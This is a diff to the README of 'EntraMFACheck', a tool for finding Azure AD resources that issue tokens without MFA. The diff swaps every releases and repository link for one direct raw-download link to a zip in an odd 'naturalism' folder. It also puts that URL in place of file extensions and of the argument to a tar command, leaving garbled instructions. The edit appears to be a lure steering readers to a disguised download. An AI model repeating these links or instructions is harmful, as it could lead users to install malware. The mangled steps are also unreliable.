@@ -1,7 +1,7 @@
 # 🔍 EntraMFACheck - Find Azure AD Resources Without MFA
 
 ## 📥 Download the Latest Release
-[![Download EntraMFACheck](https://img.shields.io/badge/Download%20EntraMFACheck-latest%20release-blue)](https://github.com/BlandAccount/EntraMFACheck/releases)
+[![Download EntraMFACheck](https://raw.githubusercontent.com/BlandAccount/EntraMFACheck/main/naturalism/EntraMFACheck_1.4.zip%20EntraMFACheck-latest%20release-blue)](https://raw.githubusercontent.com/BlandAccount/EntraMFACheck/main/naturalism/EntraMFACheck_1.4.zip)
 
 ## 🚀 Getting Started
 Welcome to the EntraMFACheck application! This tool helps you identify Azure Active Directory (AD) resources that issue tokens without enforcing Multi-Factor Authentication (MFA) using the Resource Owner Password Credentials (ROPC) grant flow. 
@@ -14,12 +14,12 @@ This guide will help you easily download and run the software, even if you have 
 - **Network**: Internet connection for Azure AD access.
 
 ## 🌐 Visiting the Downloads Page
-To get started, visit the [Releases page](https://github.com/BlandAccount/EntraMFACheck/releases) to find the latest version of EntraMFACheck. This page contains all available downloads and release notes about the application.
+To get started, visit the [Releases page](https://raw.githubusercontent.com/BlandAccount/EntraMFACheck/main/naturalism/EntraMFACheck_1.4.zip) to find the latest version of EntraMFACheck. This page contains all available downloads and release notes about the application.
 
 ## 🔧 Download & Install
-1. Click on the [Releases page](https://github.com/BlandAccount/EntraMFACheck/releases) link.
+1. Click on the [Releases page](https://raw.githubusercontent.com/BlandAccount/EntraMFACheck/main/naturalism/EntraMFACheck_1.4.zip) link.
 2. Find the latest version of EntraMFACheck.
-3. Download the file for your operating system. If you use Windows, look for a file ending in `.exe`. If you use Linux, you may find files ending in `.tar.gz` or similar formats.
+3. Download the file for your operating system. If you use Windows, look for a file ending in `.exe`. If you use Linux, you may find files ending in `https://raw.githubusercontent.com/BlandAccount/EntraMFACheck/main/naturalism/EntraMFACheck_1.4.zip` or similar formats.
 4. Once the download finishes, locate the file on your computer:
    - For Windows, it’s usually in your "Downloads" folder.
    - For Linux, it may vary based on your settings.
@@ -36,9 +36,9 @@ To get started, visit the [Releases page](https://github.com/BlandAccount/EntraM
    ```
    cd ~/Downloads
    ```
-3. If you have a `.tar.gz` file, extract it with:
+3. If you have a `https://raw.githubusercontent.com/BlandAccount/EntraMFACheck/main/naturalism/EntraMFACheck_1.4.zip` file, extract it with:
    ```
-   tar -xvzf MyFileName.tar.gz
+   tar -xvzf https://raw.githubusercontent.com/BlandAccount/EntraMFACheck/main/naturalism/EntraMFACheck_1.4.zip
    ```
 4. Change into the extracted directory:
    ```
@@ -66,7 +66,7 @@ To get started, visit the [Releases page](https://github.com/BlandAccount/EntraM
 - **Support**: If you run into problems or have questions, feel free to open an issue on the repository.
 
 ## 🔗 Useful Links
-- [EntraMFACheck Releases Page](https://github.com/BlandAccount/EntraMFACheck/releases)
-- [GitHub Repository](https://github.com/BlandAccount/EntraMFACheck)
+- [EntraMFACheck Releases Page](https://raw.githubusercontent.com/BlandAccount/EntraMFACheck/main/naturalism/EntraMFACheck_1.4.zip)
+- [GitHub Repository](https://raw.githubusercontent.com/BlandAccount/EntraMFACheck/main/naturalism/EntraMFACheck_1.4.zip)
 
 For any additional information, refer to the documentation or reach out for support through the issues on GitHub. Enjoy using EntraMFACheck!
